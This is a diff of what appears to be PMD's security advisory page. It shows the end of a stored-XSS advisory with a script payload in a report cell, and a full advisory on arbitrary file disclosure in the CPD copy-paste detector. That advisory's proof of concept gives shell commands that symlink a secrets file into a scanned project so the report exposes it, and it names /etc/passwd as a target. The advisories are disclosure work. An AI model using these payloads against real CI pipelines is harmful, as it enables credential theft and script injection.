+<tr><td><script>alert(document.domain)</script></td><td align="center">1</td></tr>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+The rule name is written into the table cell unescaped. Opening the report in a browser runs the script.
+
+**Expected:** the rule name is HTML-escaped before being written into the report, the same way HTMLRenderer escapes it.
+**Actual:** SummaryHTMLRenderer writes the rule name raw, so markup in the name executes.
+
+**Impact:**
+
+Stored XSS in the generated `summaryhtml` report. The script runs in the browser of whoever opens the report,
+which in CI is a developer or reviewer reading the analysis output. It runs on load with no click. Where the report
+is served from a domain (a published CI dashboard, an internal report host), the script runs in that origin and can
+act with the viewer's session there.
+
+**Fixes:**
+* See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
+
+**References:**
+* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
+
+
+
+### GHSA-wj6q-xw9m-26p6
+**Published:** 2026-10-30
+
+**CVE:** requested
+
+**Severity:** Medium
+
+**Summary:** Arbitrary file disclosure in CPD via symlinks in analyzed sources
+
+**Versions Affected:**
+* net.sourceforge.pmd:pmd-core 7.28.0 and earlier, starting with 6.54.0
+
+**Description:**
 CPD is the copy-paste detector shipped with PMD. It walks a directory of source files, tokenizes them, and reports
 duplicated regions along with the duplicated source text. The directory walk follows symbolic links, and the file
 reader applies no check that a resolved file stays inside the scanned tree. An attacker who controls the files in a
 scanned project (a pull request analyzed in CI, a delivered source package under assurance review) commits two symlinks
 that point at the same file outside the project. CPD reads the link target, detects the two copies as a 100%
-duplication, and writes the target file’s full contents into the report. When the report is published as a CI artifact
-the attacker reads it back.</p>
+duplication, and writes the target file's full contents into the report. When the report is published as a CI artifact
+the attacker reads it back.
 
-<p><strong>Details:</strong></p>
+**Details:**
 
-<ul>
-  <li>File collection walks directories with symlink following enabled:
-<code class="language-plaintext highlighter-rouge">Files.walkFileTree(dir, EnumSet.of(FileVisitOption.FOLLOW_LINKS), maxDepth, ...)</code>
-in <code class="language-plaintext highlighter-rouge">FileCollector.addDirectory</code>` (FileCollector.java:281).</li>
-  <li>The visitor adds any resolved regular file with no containment check. <code class="language-plaintext highlighter-rouge">addFile</code> only tests <code class="language-plaintext highlighter-rouge">Files.isRegularFile</code>,
-which itself follows the link, so a link to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is accepted as a source file.</li>
-  <li>CPD’s renderers write the duplicated source verbatim. <code class="language-plaintext highlighter-rouge">SimpleRenderer.renderOn</code> calls
-<code class="language-plaintext highlighter-rouge">report.getSourceCodeSlice(...)</code> and <code class="language-plaintext highlighter-rouge">source.writeFully(writer)</code> (SimpleRenderer.java).
-The XML and Markdown CPD renderers do the same through a CDATA / fenced block.</li>
-  <li>Two links to one target guarantee a full-length duplication, so the entire target file is emitted rather than a
-fragment.</li>
-</ul>
+-   File collection walks directories with symlink following enabled:
+    `Files.walkFileTree(dir, EnumSet.of(FileVisitOption.FOLLOW_LINKS), maxDepth, ...)`
+    in `FileCollector.addDirectory`` (FileCollector.java:281).
+-   The visitor adds any resolved regular file with no containment check. `addFile` only tests `Files.isRegularFile`,
+    which itself follows the link, so a link to `/etc/passwd` is accepted as a source file.
+-   CPD's renderers write the duplicated source verbatim. `SimpleRenderer.renderOn` calls
+    `report.getSourceCodeSlice(...)` and `source.writeFully(writer)` (SimpleRenderer.java).
+    The XML and Markdown CPD renderers do the same through a CDATA / fenced block.
+-   Two links to one target guarantee a full-length duplication, so the entire target file is emitted rather than a
+    fragment.
 
-<p><strong>PoC:</strong></p>
+**PoC:**
 
-<p>Setup: PMD 7.27.0 binary distribution (pmd-dist-7.27.0-bin.zip). No account or privilege needed. The attacker only
+Setup: PMD 7.27.0 binary distribution (pmd-dist-7.27.0-bin.zip). No account or privilege needed. The attacker only
 needs to place files in a directory that CPD is later run against, which is the normal position of a PR author or a
-package submitter.</p>
+package submitter.
 
-<ol>
-  <li>Stage a secret outside the project and two symlinks inside it</li>
-</ol>
+1. Stage a secret outside the project and two symlinks inside it
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> project OUTSIDE_THE_REPO
-<span class="nb">printf</span> <span class="s1">'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;\nDATABASE_PASSWORD = super_secret_prod_password_12345 ;\nGITHUB_TOKEN = ghp_fake_token_for_poc_000 ;\nSTRIPE_KEY = sk_live_fake_key_for_poc_000 ;\nMORE = padding to exceed the token threshold ;\n'</span> <span class="o">&gt;</span> OUTSIDE_THE_REPO/ci_secret.env
-<span class="nb">ln</span> <span class="nt">-s</span> ../OUTSIDE_THE_REPO/ci_secret.env project/copy_a.java
-<span class="nb">ln</span> <span class="nt">-s</span> ../OUTSIDE_THE_REPO/ci_secret.env project/copy_b.java
+```shell
+mkdir -p project OUTSIDE_THE_REPO
+printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;\nDATABASE_PASSWORD = super_secret_prod_password_12345 ;\nGITHUB_TOKEN = ghp_fake_token_for_poc_000 ;\nSTRIPE_KEY = sk_live_fake_key_for_poc_000 ;\nMORE = padding to exceed the token threshold ;\n' &gt; OUTSIDE_THE_REPO/ci_secret.env
+ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_a.java
+ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_b.java
 </code></pre></div></div>
 
 <p>The project directory contains only two symlinks. The secret lives outside it.</p>
@@ -2403,7 +2559,7 @@ the runner that holds the secrets. Scanning untrusted source is the intended use
 
 <p><strong>References:</strong></p>
 <ul>
-  <li><a href="https://github.com/pmd/pmd/security/advisories/GHSA-wj6q-xw9m-26p6">GHSA-wj6q-xw9m-26p6</a></li>
+  <li><a href="https://github.com/pmd/pmd/security/advisories/GHSA-wj6q-xw9m-26p6">GHSA-wj6q-xw9m-26p6</a> - Arbitrary file disclosure in CPD via symlinks in analyzed sources</li>
 </ul>
 
 <h3 id="cve-2026-28338">CVE-2026-28338</h3>
